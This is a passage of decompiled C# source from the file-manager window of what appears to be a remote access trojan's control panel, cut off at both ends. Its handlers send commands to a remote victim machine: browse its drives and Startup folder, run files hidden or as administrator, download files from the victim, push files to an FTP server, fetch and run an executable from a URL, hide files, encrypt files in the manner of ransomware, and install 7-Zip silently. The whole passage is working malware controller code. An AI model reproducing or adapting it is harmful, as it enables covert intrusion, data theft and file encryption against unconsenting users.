					CS$<>8__locals1.$VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
			}
		}

		// Token: 0x06000191 RID: 401 RVA: 0x0000D6BC File Offset: 0x0000B8BC
		private void BackToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.Guna2TextBox1.Text.Length < 4;
				if (flag)
				{
					this.Guna2TextBox1.Text = "";
					byte[] state = Helper.SB("GetDrives");
					Client $VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
				else
				{
					this.Guna2TextBox1.Text = this.Guna2TextBox1.Text.Substring(0, this.Guna2TextBox1.Text.LastIndexOf("\\"));
					this.Guna2TextBox1.Text = this.Guna2TextBox1.Text.Substring(0, checked(this.Guna2TextBox1.Text.LastIndexOf("\\") + 1));
					this.RefreshList();
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x06000192 RID: 402 RVA: 0x0000D7C4 File Offset: 0x0000B9C4
		private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.RefreshList();
		}

		// Token: 0x06000193 RID: 403 RVA: 0x0000D7D0 File Offset: 0x0000B9D0
		private void DesktopToolStripMenuItem_Click(object sender, EventArgs e)
		{
			byte[] state = Helper.SB("GOTO" + SettingsHelper.SPL + "Desktop");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x06000194 RID: 404 RVA: 0x0000D820 File Offset: 0x0000BA20
		private void UserFolderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			byte[] state = Helper.SB("GOTO" + SettingsHelper.SPL + "User");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x06000195 RID: 405 RVA: 0x0000D870 File Offset: 0x0000BA70
		private void TempToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			byte[] state = Helper.SB("GOTO" + SettingsHelper.SPL + "Temp");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x06000196 RID: 406 RVA: 0x0000D8C0 File Offset: 0x0000BAC0
		private void AppDataToolStripMenuItem_Click(object sender, EventArgs e)
		{
			byte[] state = Helper.SB("GOTO" + SettingsHelper.SPL + "AppData");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x06000197 RID: 407 RVA: 0x0000D910 File Offset: 0x0000BB10
		private void StartupToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			byte[] state = Helper.SB("GOTO" + SettingsHelper.SPL + "Startup");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x06000198 RID: 408 RVA: 0x0000D960 File Offset: 0x0000BB60
		private void CopyToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			this.ccppath = null;
			this.ccps = null;
			try
			{
				foreach (object obj in this.ListView1.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					ref string ptr = ref this.ccppath;
					this.ccppath = ptr + "-=>" + this.Guna2TextBox1.Text + listViewItem.Text;
					this.ccps = "-=>";
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x06000199 RID: 409 RVA: 0x0000DA00 File Offset: 0x0000BC00
		private void CutToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			this.ccppath = null;
			this.ccps = null;
			try
			{
				foreach (object obj in this.ListView1.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					ref string ptr = ref this.ccppath;
					this.ccppath = ptr + "-=>" + this.Guna2TextBox1.Text + listViewItem.Text;
					this.ccps = "*";
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x0600019A RID: 410 RVA: 0x0000DAA0 File Offset: 0x0000BCA0
		private void PasteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.ccps, "-=>", false) == 0;
			if (flag)
			{
				byte[] state = Helper.SB(string.Concat(new string[]
				{
					"CPP",
					SettingsHelper.SPL,
					this.ccppath,
					SettingsHelper.SPL,
					this.Guna2TextBox1.Text
				}));
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
				this.ccppath = null;
				this.ccps = null;
			}
			bool flag2 = Operators.CompareString(this.ccps, "*", false) == 0;
			if (flag2)
			{
				byte[] state2 = Helper.SB(string.Concat(new string[]
				{
					"CTT",
					SettingsHelper.SPL,
					this.ccppath,
					SettingsHelper.SPL,
					this.Guna2TextBox1.Text
				}));
				Client $VB$NonLocal_3 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_3.BeginSend((byte[])a0);
				}, state2);
				this.ccppath = null;
				this.ccps = null;
			}
		}

		// Token: 0x0600019B RID: 411 RVA: 0x0000DBD0 File Offset: 0x0000BDD0
		private void EditToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			byte[] state = Helper.SB("tss" + SettingsHelper.SPL + this.Guna2TextBox1.Text + this.ListView1.FocusedItem.Text);
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x0600019C RID: 412 RVA: 0x0000DC34 File Offset: 0x0000BE34
		private void NormalToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.ListView1.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					byte[] state = Helper.SB("Execute" + SettingsHelper.SPL + this.Guna2TextBox1.Text + listViewItem.Text);
					FM._Closure$__R279-34 CS$<>8__locals1 = new FM._Closure$__R279-34(CS$<>8__locals1);
					CS$<>8__locals1.$VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x0600019D RID: 413 RVA: 0x0000DCE4 File Offset: 0x0000BEE4
		private void HiddenToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.ListView1.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					byte[] state = Helper.SB("ExecuteHide" + SettingsHelper.SPL + this.Guna2TextBox1.Text + listViewItem.Text);
					FM._Closure$__R280-36 CS$<>8__locals1 = new FM._Closure$__R280-36(CS$<>8__locals1);
					CS$<>8__locals1.$VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x0600019E RID: 414 RVA: 0x0000DD94 File Offset: 0x0000BF94
		private void RunAsToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.ListView1.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					byte[] state = Helper.SB("ExecuteRunAs" + SettingsHelper.SPL + this.Guna2TextBox1.Text + listViewItem.Text);
					FM._Closure$__R281-38 CS$<>8__locals1 = new FM._Closure$__R281-38(CS$<>8__locals1);
					CS$<>8__locals1.$VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x0600019F RID: 415 RVA: 0x0000DE44 File Offset: 0x0000C044
		private void RenameToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.ListView1.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					int imageIndex = listViewItem.ImageIndex;
					bool flag = imageIndex >= 0 && imageIndex <= 1;
					if (!flag)
					{
						flag = (imageIndex == 2);
						if (flag)
						{
							string text = Interaction.InputBox("Enter New Folder Name", "Folder", listViewItem.Text, -1, -1);
							bool flag2 = Operators.CompareString(text, listViewItem.Text, false) == 0 | string.IsNullOrEmpty(text);
							if (flag2)
							{
								break;
							}
							byte[] state = Helper.SB(string.Concat(new string[]
							{
								"Rename",
								SettingsHelper.SPL,
								"Folder",
								SettingsHelper.SPL,
								this.Guna2TextBox1.Text,
								listViewItem.Text,
								SettingsHelper.SPL,
								text
							}));
							FM._Closure$__R282-40 CS$<>8__locals1 = new FM._Closure$__R282-40(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = this.C;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
						else
						{
							string text2 = Interaction.InputBox("Enter New File Name", "File", listViewItem.Text, -1, -1);
							bool flag3 = Operators.CompareString(text2, listViewItem.Text, false) == 0 | string.IsNullOrEmpty(text2);
							if (flag3)
							{
								break;
							}
							byte[] state2 = Helper.SB(string.Concat(new string[]
							{
								"Rename",
								SettingsHelper.SPL,
								"File",
								SettingsHelper.SPL,
								this.Guna2TextBox1.Text,
								listViewItem.Text,
								SettingsHelper.SPL,
								text2
							}));
							FM._Closure$__R282-41 CS$<>8__locals2 = new FM._Closure$__R282-41(CS$<>8__locals2);
							CS$<>8__locals2.$VB$NonLocal_3 = this.C;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals2.$VB$NonLocal_3.BeginSend((byte[])a0);
							}, state2);
						}
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x060001A0 RID: 416 RVA: 0x0000E068 File Offset: 0x0000C268
		private void DeleteToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.ListView1.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					int imageIndex = listViewItem.ImageIndex;
					bool flag = imageIndex >= 0 && imageIndex <= 1;
					if (!flag)
					{
						flag = (imageIndex == 2);
						if (flag)
						{
							byte[] state = Helper.SB(string.Concat(new string[]
							{
								"Delete",
								SettingsHelper.SPL,
								"Folder",
								SettingsHelper.SPL,
								this.Guna2TextBox1.Text,
								listViewItem.Text
							}));
							FM._Closure$__R283-44 CS$<>8__locals1 = new FM._Closure$__R283-44(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = this.C;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
						else
						{
							byte[] state2 = Helper.SB(string.Concat(new string[]
							{
								"Delete",
								SettingsHelper.SPL,
								"File",
								SettingsHelper.SPL,
								this.Guna2TextBox1.Text,
								listViewItem.Text
							}));
							FM._Closure$__R283-45 CS$<>8__locals2 = new FM._Closure$__R283-45(CS$<>8__locals2);
							CS$<>8__locals2.$VB$NonLocal_3 = this.C;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals2.$VB$NonLocal_3.BeginSend((byte[])a0);
							}, state2);
						}
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x060001A1 RID: 417 RVA: 0x0000E1F0 File Offset: 0x0000C3F0
		private void UploadToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog
			{
				Filter = "All files (*.*)|*.*",
				Multiselect = true
			};
			DialogResult dialogResult = openFileDialog.ShowDialog();
			bool flag = dialogResult == DialogResult.OK;
			checked
			{
				if (flag)
				{
					string[] fileNames = openFileDialog.FileNames;
					int num = fileNames.Length - 1;
					for (int i = 0; i <= num; i++)
					{
						byte[] state = Helper.SB(string.Concat(new string[]
						{
							"sendfileto",
							SettingsHelper.SPL,
							this.Guna2TextBox1.Text,
							Path.GetFileName(fileNames[i]),
							SettingsHelper.SPL,
							Convert.ToBase64String(Helper.Compress(File.ReadAllBytes(fileNames[i])))
						}));
						this.ToolStripStatusLabel1.ForeColor = Color.Green;
						this.ToolStripStatusLabel1.Text = Path.GetFileName(fileNames[i]) + " Uploading..";
						this.ToolStripStatusLabel1.Visible = true;
						FM._Closure$__R284-48 CS$<>8__locals1 = new FM._Closure$__R284-48(CS$<>8__locals1);
						CS$<>8__locals1.$VB$NonLocal_2 = this.C;
						ThreadPool.QueueUserWorkItem(delegate(object a0)
						{
							CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
						}, state);
					}
				}
			}
		}

		// Token: 0x060001A2 RID: 418 RVA: 0x0000E314 File Offset: 0x0000C514
		private void DownloadToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.ListView1.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"downloadfile",
						SettingsHelper.SPL,
						this.Guna2TextBox1.Text,
						listViewItem.Text,
						SettingsHelper.SPL,
						listViewItem.Text
					}));
					FM._Closure$__R285-50 CS$<>8__locals1 = new FM._Closure$__R285-50(CS$<>8__locals1);
					CS$<>8__locals1.$VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x060001A3 RID: 419 RVA: 0x0000E3E8 File Offset: 0x0000C5E8
		private void NewFolderToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			string text = Interaction.InputBox("Enter The folder's Name", "Creat New Folder", "", -1, -1);
			bool flag = !string.IsNullOrEmpty(text);
			if (flag)
			{
				byte[] state = Helper.SB("creatnewfolder" + SettingsHelper.SPL + this.Guna2TextBox1.Text + text);
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
			}
		}

		// Token: 0x060001A4 RID: 420 RVA: 0x0000E464 File Offset: 0x0000C664
		private void NewFileToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string text = Interaction.InputBox("Enter The File Name", "Creat New File", "", -1, -1);
			bool flag = !string.IsNullOrEmpty(text);
			if (flag)
			{
				byte[] state = Helper.SB("creatfile" + SettingsHelper.SPL + this.Guna2TextBox1.Text + text);
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
			}
		}

		// Token: 0x060001A5 RID: 421 RVA: 0x0000E4E0 File Offset: 0x0000C6E0
		private void ShowFolderFileToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.ListView1.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					byte[] state = Helper.SB("showfolderfile" + SettingsHelper.SPL + this.Guna2TextBox1.Text + listViewItem.Text);
					FM._Closure$__R288-56 CS$<>8__locals1 = new FM._Closure$__R288-56(CS$<>8__locals1);
					CS$<>8__locals1.$VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x060001A6 RID: 422 RVA: 0x0000E590 File Offset: 0x0000C790
		private void HideFolderFileToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.ListView1.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					byte[] state = Helper.SB("hidefolderfile" + SettingsHelper.SPL + this.Guna2TextBox1.Text + listViewItem.Text);
					FM._Closure$__R289-58 CS$<>8__locals1 = new FM._Closure$__R289-58(CS$<>8__locals1);
					CS$<>8__locals1.$VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x060001A7 RID: 423 RVA: 0x0000E640 File Offset: 0x0000C840
		private void HiddenInstallationlToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				byte[] state = Helper.SB(string.Concat(new string[]
				{
					"7zIT",
					SettingsHelper.SPL,
					Convert.ToBase64String(Helper.Compress(Resources._7z)),
					SettingsHelper.SPL,
					Convert.ToBase64String(Helper.Compress(Resources._7zD))
				}));
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x060001A8 RID: 424 RVA: 0x0000E6F0 File Offset: 0x0000C8F0
		private void ZipToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			string text;
			try
			{
				foreach (object obj in this.ListView1.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					text = string.Concat(new string[]
					{
						text,
						" -ir!\"",
						this.Guna2TextBox1.Text,
						listViewItem.Text,
						"\" "
					});
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			byte[] state = Helper.SB(string.Concat(new string[]
			{
				"7z",
				SettingsHelper.SPL,
				" a -r \"",
				this.Guna2TextBox1.Text,
				this.ListView1.FocusedItem.Text,
				".zip\"",
				text,
				" -y"
			}));
			FM._Closure$__R291-62 CS$<>8__locals1 = new FM._Closure$__R291-62(CS$<>8__locals1);
			CS$<>8__locals1.$VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x060001A9 RID: 425 RVA: 0x0000E810 File Offset: 0x0000CA10
		private void UnzipToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.ListView1.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"7z",
						SettingsHelper.SPL,
						" x \"",
						this.Guna2TextBox1.Text,
						listViewItem.Text,
						"\" -o\"",
						this.Guna2TextBox1.Text,
						listViewItem.Text.Replace(".zip", ""),
						"\" -y"
					}));
					FM._Closure$__R292-64 CS$<>8__locals1 = new FM._Closure$__R292-64(CS$<>8__locals1);
					CS$<>8__locals1.$VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x060001AA RID: 426 RVA: 0x0000E914 File Offset: 0x0000CB14
		private void UploadToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
			string text = Conversions.ToString(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "Ftphost", null));
			string text2 = Conversions.ToString(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "Ftpuser", null));
			string text3 = Conversions.ToString(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "Ftppass", null));
			string text4 = Conversions.ToString(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "Ftpport", null));
			string text5 = null;
			try
			{
				foreach (object obj in this.ListView1.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					text5 = text5 + "-=>" + this.Guna2TextBox1.Text + listViewItem.Text;
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			byte[] state = Helper.SB(string.Concat(new string[]
			{
				"UPtoFtp",
				SettingsHelper.SPL,
				text2,
				SettingsHelper.SPL,
				text3,
				SettingsHelper.SPL,
				text,
				SettingsHelper.SPL,
				text4,
				SettingsHelper.SPL,
				text5
			}));
			FM._Closure$__R293-66 CS$<>8__locals1 = new FM._Closure$__R293-66(CS$<>8__locals1);
			CS$<>8__locals1.$VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x060001AB RID: 427 RVA: 0x0000EAA4 File Offset: 0x0000CCA4
		private void SettingsToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			new Ftp
			{
				StartPosition = FormStartPosition.CenterParent
			}.ShowDialog();
		}

		// Token: 0x060001AC RID: 428 RVA: 0x0000EAC8 File Offset: 0x0000CCC8
		private void SendFromLinkToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			string defaultResponse = "http://www.example.com/File.exe";
			string text = Interaction.InputBox("Set The Url", "From Url", defaultResponse, -1, -1);
			string defaultResponse2 = "server.exe";
			string text2 = Interaction.InputBox("Set The File Name", "File Name", defaultResponse2, -1, -1);
			bool flag = text.Length == 0 | text2.Length == 0;
			if (!flag)
			{
				byte[] state = Helper.SB(string.Concat(new string[]
				{
					"FURL",
					SettingsHelper.SPL,
					text,
					SettingsHelper.SPL,
					this.Guna2TextBox1.Text,
					text2
				}));
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
			}
		}

		// Token: 0x060001AD RID: 429 RVA: 0x0000EB90 File Offset: 0x0000CD90
		private void SetBackgroundToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			byte[] state = Helper.SB("ChangeWL" + SettingsHelper.SPL + this.Guna2TextBox1.Text + this.ListView1.FocusedItem.Text);
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x060001AE RID: 430 RVA: 0x0000EBF4 File Offset: 0x0000CDF4
		private void PlayToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			byte[] state = Helper.SB("RSS" + SettingsHelper.SPL + this.Guna2TextBox1.Text + this.ListView1.FocusedItem.Text);
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x060001AF RID: 431 RVA: 0x0000EC58 File Offset: 0x0000CE58
		private void StopToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			byte[] state = Helper.SB("RSSDis");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x060001B0 RID: 432 RVA: 0x0000EC98 File Offset: 0x0000CE98
		private void Guna2TextBox1_KeyDown(object sender, KeyEventArgs e)
		{
			bool flag = e.KeyCode == Keys.Return;
			if (flag)
			{
				e.SuppressKeyPress = true;
				this.RefreshList();
			}
		}

		// Token: 0x060001B1 RID: 433 RVA: 0x0000ECC8 File Offset: 0x0000CEC8
		private void EncryptToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string text = null;
			try
			{
				foreach (object obj in this.ListView1.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					text = text + "-=>" + this.Guna2TextBox1.Text + listViewItem.Text;
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			byte[] state = Helper.SB("ENC" + SettingsHelper.SPL + text);
			FM._Closure$__R300-76 CS$<>8__locals1 = new FM._Closure$__R300-76(CS$<>8__locals1);
			CS$<>8__locals1.$VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x060001B2 RID: 434 RVA: 0x0000ED88 File Offset: 0x0000CF88
		private void DecryptToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string text = null;
			try
			{
				foreach (object obj in this.ListView1.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					text = text + "-=>" + this.Guna2TextBox1.Text + listViewItem.Text;
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			byte[] state = Helper.SB("DEC" + SettingsHelper.SPL + text);
			FM._Closure$__R301-78 CS$<>8__locals1 = new FM._Closure$__R301-78(CS$<>8__locals1);
			CS$<>8__locals1.$VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x060001B3 RID: 435 RVA: 0x0000EE48 File Offset: 0x0000D048
		private void LockToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.ListView1.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					byte[] state = Helper.SB("LockDir" + SettingsHelper.SPL + this.Guna2TextBox1.Text + listViewItem.Text);
					FM._Closure$__R302-80 CS$<>8__locals1 = new FM._Closure$__R302-80(CS$<>8__locals1);
					CS$<>8__locals1.$VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x060001B4 RID: 436 RVA: 0x0000EEF8 File Offset: 0x0000D0F8
		private void UnlockToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.ListView1.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					byte[] state = Helper.SB("UnlockDir" + SettingsHelper.SPL + this.Guna2TextBox1.Text + listViewItem.Text);
					FM._Closure$__R303-82 CS$<>8__locals1 = new FM._Closure$__R303-82(CS$<>8__locals1);
					CS$<>8__locals1.$VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x060001B5 RID: 437 RVA: 0x0000EFA8 File Offset: 0x0000D1A8
		private void DownloadFolderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Path.Combine(Application.StartupPath, "ClientsFolder", this.CID);
				bool flag = !Directory.Exists(text);
				if (flag)
				{
					Directory.CreateDirectory(text);
				}
				Process.Start(text);
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x060001B6 RID: 438 RVA: 0x0000F018 File Offset: 0x0000D218
		private void Guna2GradientButton4_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.Guna2TextBox1.Text.Length < 4;
				if (flag)
				{
					this.Guna2TextBox1.Text = "";
					byte[] state = Helper.SB("GetDrives" + SettingsHelper.SPL);
					Client $VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
				else
				{
					this.Guna2TextBox1.Text = this.Guna2TextBox1.Text.Substring(0, this.Guna2TextBox1.Text.LastIndexOf("\\"));
					this.Guna2TextBox1.Text = this.Guna2TextBox1.Text.Substring(0, checked(this.Guna2TextBox1.Text.LastIndexOf("\\") + 1));
					this.RefreshList();
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x060001B7 RID: 439 RVA: 0x0000F12C File Offset: 0x0000D32C
		private void Guna2TextBox2_TextChanged(object sender, EventArgs e)
		{
			try
			{
